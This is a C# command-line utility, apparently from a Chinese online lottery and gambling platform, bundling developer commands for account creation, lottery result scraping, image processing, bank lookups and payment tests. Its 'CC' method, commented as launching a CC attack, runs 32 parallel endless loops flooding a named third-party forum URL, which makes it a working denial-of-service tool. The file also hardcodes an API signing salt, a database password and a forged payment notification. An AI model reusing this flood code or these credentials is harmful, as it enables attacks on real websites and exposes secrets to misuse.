using BW.Agent;
using BW.Common.Lottery;
using BW.Common.Lottery.Limited;
using BW.GateWay.Lottery;
using SP.Studio.Array;
using SP.Studio.Core;
using SP.Studio.Data;
using SP.Studio.Model;
using SP.Studio.Net;
using SP.Studio.Security;
using SP.Studio.Web;
using SP.Studio.Xml;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;

namespace Post
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("没有指定动作");

                TimeSpan time = TimeSpan.Parse("15:00");
                Console.WriteLine(time.TotalMinutes);

                Console.Write(DateTime.Now.ToString("yyMMddHHmmss-ffff"));
                return;
            }

            switch (args[0].ToLower())
            {
                case "bbin":
                    BBIN(args[1], args[2]);
                    break;
                case "kl8":
                    Console.WriteLine(BetWinClient.Utils.GetOpenCode(args[1]));
                    break;
                case "client":
                    Client(args.Skip(1).ToArray());
                    break;
                // 使用开采网的接口进行不开
                case "dateopen":
                    DateOpen(args.Skip(1).ToArray());
                    break;
                // 测试限号
                case "limited":
                    Limited(args.Skip(1).ToArray());
                    break;
                //从支付宝获取所属银行
                case "bank":
                    Bank(args.Skip(1).ToArray());
                    break;
                case "test":
                    Test();
                    break;
                case "lock":
                    Lock();
                    break;
                case "cc":
                    CC(args.Skip(1).ToArray());
                    break;
                case "app":

                    break;
                case "testdb":
                    new TestAgent().TestComment();
                    break;
                case "testpk10":
                    List<string> num = new List<string>();
                    string number = args[1];

                    Regex regex = new Regex(@"(10)|(1)|(2)|(3)|(4)|(5)|(6)|(7)|(8)|(9)");
                    regex.Replace(number, match =>
                    {
                        num.Add(match.Value);
                        return string.Empty;
                    });

                    Console.WriteLine(string.Join(",", num));

                    break;
                case "trend":
                    using (BW.Common.BetDataContext BDC = new BW.Common.BetDataContext())
                    {
                        var list = BDC.ResultNumber.Where(t => t.Type == LotteryType.ChungKing).OrderBy(t => t.Index);
                        var count = list.Count();
                        var index = 0;
                        foreach (var item in list)
                        {
                            LotteryAgent.Instance().MessageClean();
                            if (LotteryAgent.Instance().CreateTrend(LotteryType.ChungKing, item.Index, item.Number))
                            {
                                index++;
                                Console.CursorLeft = 0;
                                Console.Write("{0}/{1}", index, count);

                            }
                        }
                    }
                    break;
                case "time":
                    Console.WriteLine(DateTime.Now.AddSeconds(int.Parse(args[1])));
                    break;
                case "task":
                    System.Threading.Tasks.Parallel.For(0, 5, t =>
                    {
                        Console.WriteLine(t);
                    });
                    break;
                case "mg":  // MG的图片修改
                    MG(args.Skip(1).ToArray());
                    break;
                case "pay": // 测试支付通知
                    string paydata = "{\"info\": \"pay success\", \"fee\": 100, \"notifyUrl\": \"http://ceshi.xlai.co/handler/payment/HaiFuPay\", \"tradeNum\": \"29c16571df3888339381cfddf626ea67\", \"errcode\": 200, \"sign\": \"FE1981DE570A65653E7BF3F906E20FCCB5DB2934\", \"state\": 1, \"time\": \"2018-03-15 15:59:43.666851\", \"opUserId\": \"e23cf8aa29308ccca8ea6dd275598e11\", \"productId\": \"20180315155905464\"}";

                    string payResult = NetAgent.UploadData("http://www.xlaiyl.net/handler/payment/HaiFuPay", paydata, Encoding.UTF8);
                    Console.WriteLine(payResult);
                    break;
            }
        }

        /// <summary>
        /// 创建BBIN帐号
        /// </summary>
        /// <param name="playerName"></param>
        /// <param name="password"></param>
        private static void BBIN(string playerName, string password)
        {
            Func<int, string> random = (length) =>
             {
                 return Guid.NewGuid().ToString("N").ToLower().Substring(0, length);
             };
            string date = DateTime.Now.AddHours(-12).ToString("yyyyMMdd");
            string source = "avia" + playerName + "3QcgFxyY0" + date;
            string key = string.Format("{0}{1}{2}", random(7),
               MD5.toMD5(source), random(1)).ToLower();

            Dictionary<string, string> dic = new Dictionary<string, string>();
            dic.Add("website", "avia");
            dic.Add("username", playerName);
            dic.Add("uppername", "dboqu");
            dic.Add("password", password);
            dic.Add("key", key);

            string url = "http://bbin.api.a8.to/app/WebService/XML/display.php/CreateMember";

            string result = NetAgent.UploadData(url, dic.ToQueryString(), Encoding.UTF8);

            Console.WriteLine(result);
        }

        private static void MG(string[] args)
        {
            if (args.Length == 0)
            {
                string[] images = Directory.GetFiles(@"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg-source\");
                XElement root = XElement.Parse(File.ReadAllText(@"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg.xml"));
                string target = @"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg-target\";
                foreach (XElement item in root.Elements())
                {
                    string pc = item.GetAttributeValue("pc");
                    string mobile = item.GetAttributeValue("mobile");

                    foreach (string name in item.GetAttributeValue("name").Split('/').Select(t => t.Trim()))
                    {
                        string image = images.Where(t => t.Contains(name)).FirstOrDefault();
                        if (string.IsNullOrEmpty(image)) continue;
                        string type = image.Substring(image.LastIndexOf('.'));
                        foreach (string id in new string[] { pc, mobile }.Where(t => !string.IsNullOrEmpty(t)))
                        {
                            Console.WriteLine(id + "\t" + image);
                            File.Copy(image, target + id + type, true);
                        }
                    }
                }
                return;
            }

            if (args[0] == "image")
            {
                MG_image();
            }
        }

        private static void MG_image()
        {
            string[] images = Directory.GetFiles(@"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg-target\");
            string target = @"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg\";
            string bg = @"F:\2017\BetWin 2.0\WebSite\Web.Image\images\mg.png";
            int width = 145;
            int height = 136;
            foreach (string image in images)
            {
                var size = SP.Studio.Drawing.ImageAgent.GetSize(image);
                string name = image.Substring(image.LastIndexOf('\\') + 1);
                string targetFile = target + name;
                if (size.Width != 291 || size.Height != 136)
                {
                    File.Copy(image, targetFile);
                    continue;
                }
                File.Copy(bg, targetFile);
                if (!SP.Studio.Drawing.ImageAgent.CreateWaterMark(targetFile, System.Drawing.Image.FromFile(image), 0, 0, width, height))
                {
                    Console.WriteLine("{0} 失败", name);
                }
            }
        }

        /// <summary>
        /// 测试采集客户端
        /// </summary>
        /// <param name="args" name="</param>
        private static void Client(string[] args)
        {
            if (args[0] == "ALL")
            {
                BetWinClient.Gateway.LotteryFactory.Run();
                return;
            }
            LotteryType game = args[0].ToEnum<LotteryType>();
            if ((int)game == 0)
            {
                Console.WriteLine("没有指定彩种");
                return;
            }
            if (args.Length > 1)
            {
                BetWinClient.Utils.TESTURL = args[1];
            }

            Assembly ass = typeof(BetWinClient.Utils).Assembly;
            Type[] type = ass.GetTypes().Where(t => t.IsBaseType(typeof(BetWinClient.Gateway.IGateway)) && !t.IsAbstract).ToArray();
            Type lottery = type.Where(t => t.Name == game.ToString()).FirstOrDefault();
            if (lottery == null)
            {
                Console.WriteLine("没有找到类型{0}", lottery.FullName);
            }
            Stopwatch sw = new Stopwatch();
            sw.Start();
            Activator.CreateInstance(lottery);
            Console.WriteLine("总耗时：{0}ms", sw.Elapsed.TotalMilliseconds);
        }

        /// <summary>
        /// 限号性能测试
        /// </summary>
        /// <param name="args" name="</param>
        private static void Limited(string[] args)
        {
            // LotteryAgent.Instance()._site = SiteAgent.Instance().GetSiteInfo(1000);


            Console.Write("十万注写入内存，耗时：");
            Stopwatch sw = new Stopwatch();
            List<string> numberList = new List<string>();
            sw.Start();
            int[] index = new int[5];
            for (index[0] = 0; index[0] < 10; index[0]++)
                for (index[1] = 0; index[1] < 10; index[1]++)
                    for (index[2] = 0; index[2] < 10; index[2]++)
                        for (index[3] = 0; index[3] < 10; index[3]++)
                            for (index[4] = 0; index[4] < 10; index[4]++)
                                numberList.Add(string.Join(",", index));

            sw.Stop();
            Console.WriteLine("{0}ms", sw.ElapsedMilliseconds);
            sw.Restart();

            Console.Write("检查号码,{0}注，耗时：", numberList.Count);
            SiteLimited siteLimited = LotteryAgent.Instance().GetSiteLimited(LotteryType.ChungKing, "20160805-086", LimitedType.X5_Start5);
            LotteryAgent.Instance().CheckLimitedNumber(siteLimited, numberList, 200000M, 400000M);
            Console.WriteLine("{0}ms", sw.ElapsedMilliseconds);

            sw.Restart();
            Console.Write("号码检查成功，写入资金{0}注，耗时：", numberList.Count);
            LotteryAgent.Instance().AddLimitedNumber(siteLimited, numberList, 200000M);
            Console.WriteLine("{0}ms", sw.ElapsedMilliseconds);

            sw.Restart();
            Console.Write("号码转换，耗时：");
            string[][] inputNumber = "0,1,2,3,4,5,6,7,8,9|0,1,2,3,4,5,6,7,8,9|0,1,2,3,4,5,6,7,8,9|0,1,2,3,4,5,6,7,8,9|0,1,2,3,4,5,6,7,8,9".GetInputNumber();

            string[] list = inputNumber.Aggregate((t1, t2) => t1.SelectMany(p1 => t2.Select(p2 => p1 + "," + p2).ToArray()).ToArray());

            Console.WriteLine("{0}ms", sw.ElapsedMilliseconds);

        }

        private static void Test()
        {

        }

        /// <summary>
        /// 锁机制测试
        /// </summary>
        private static void Lock()
        {

            System.Threading.Tasks.Parallel.For(1, 3, t =>
            {
                lock ("1")
                {
                    Console.WriteLine(DateTime.Now);
                    System.Threading.Thread.Sleep(10 * 1000);
                }
            });
        }

        /// <summary>
        /// 获取前六位所属的银行卡号
        /// </summary>
        private static void Bank(string[] args)
        {
            string xml = System.Windows.Forms.Application.StartupPath + @"\Bank.xml";

            XElement root = XElement.Parse(System.IO.File.ReadAllText(xml, Encoding.UTF8));

            Dictionary<string, string> dic = new Dictionary<string, string>();
            foreach (XElement item in root.Elements())
            {
                string code = item.GetAttributeValue("code");
                string bank = item.GetAttributeValue("bank");

                if (!dic.ContainsKey(code)) dic.Add(code, bank);
            }

            StringBuilder sb = new StringBuilder("<root>");
            foreach (var item in dic.OrderBy(t => t.Key))
            {
                sb.AppendFormat("<item code=\"{0}\" bank=\"{1}\" />", item.Key, item.Value);
            }
            sb.Append("</root>");

            System.IO.File.WriteAllText(System.Windows.Forms.Application.StartupPath + @"\NewBank.xml", sb.ToString(), Encoding.UTF8);

            //int bank = 0;

            //int tasks = args.Get("task", 10);
            //Stopwatch sw = new Stopwatch();
            //sw.Start();
            //double total = 1000000;
            //while (bank < total)
            //{
            //    List<string> list = new List<string>();
            //    System.Threading.Tasks.Parallel.For(0, tasks, t =>
            //    {
            //        string code = (bank + t).ToString().PadLeft(6, '0');
            //        string account = string.Format("{0}3602150151611", code);
            //        string bankCode = WebAgent.GetBankCard(account);
            //        if (!string.IsNullOrEmpty(bankCode))
            //        {
            //            list.Add(string.Format("<item code=\"{0}\" bank=\"{1}\" />", code, bankCode));
            //        }
            //    });
            //    bank += (tasks - 1);
            //    Console.CursorLeft = 0;
            //    Console.Write("{0} 当前进度：{1} 总耗时：{2}", bank, (bank / total).ToString("P"), sw.Elapsed.ToString());
            //    if (list.Count > 0)
            //        System.IO.File.AppendAllLines(file, list, Encoding.UTF8);
            //}
        }

        /// <summary>
        /// 发动CC攻击
        /// </summary>
        private static void CC(params string[] args)
        {
            int count = 0;
            System.Threading.Tasks.Parallel.For(0, 32, t =>
            {
                while (true)
                {
                    count++;
                    string result = NetAgent.DownloadData("http://bbs.boniu365.co/forum.php?mod=viewthread&tid=150595&extra=page%3D1", Encoding.UTF8);
                    if (!result.StartsWith("{"))
                    {
                        Console.WriteLine(result);
                    }
                    Console.Title = count.ToString();
                    if (args.Contains("once")) break;
                }
            });
        }

        /// <summary>
        /// 通过开采网的接口进行补开操作
        /// </summary>
        /// <param name="args"></param>
        private static void DateOpen(params string[] args)
        {
            string type = args[0];
            string url = args[1];

            string result = NetAgent.DownloadData(url);
            XElement root = XElement.Parse(result);
            Dictionary<string, string> dic = new Dictionary<string, string>();
            foreach (XElement item in root.Elements())
            {
                string index = Regex.Replace(item.GetAttributeValue("expect"), @"^(?<Date>\d{8})(?<Index>\d{3})$", "${Date}-${Index}");
                string value = item.GetAttributeValue("opencode");

                dic.Add(index, value);
            }
            string data = string.Join("&", dic.Select(t => string.Format("{0}={1}", t.Key, t.Value)));
            Console.WriteLine(data);
            string saveUrl = "http://a8.to/LotteryResult.ashx?Type=" + type;
            string saveResult = NetAgent.UploadData(saveUrl, data, Encoding.UTF8);
            Console.WriteLine(saveResult);

        }
    }

    internal class TestAgent : SP.Studio.Data.DbAgent
    {
        public TestAgent()
            : base("server=(local);uid=uBetWin;pwd=CNY1000000;database=BetWin 2.0;", SP.Studio.Data.DatabaseType.SqlServer, SP.Studio.Data.DataConnectionMode.Instance)
        {

        }

        public void TestComment()
        {
            using (DbExecutor db = NewExecutor(IsolationLevel.ReadUncommitted))
            {
                db.ExecuteNonQuery(CommandType.Text, "UPDATE Users SET Money = Money*-1 WHERE UserID = 2");

                decimal money = BW.Agent.UserAgent.Instance().GetUserMoney(2, db);

                Console.WriteLine(money);
                db.Rollback();
            }
        }
    }
}
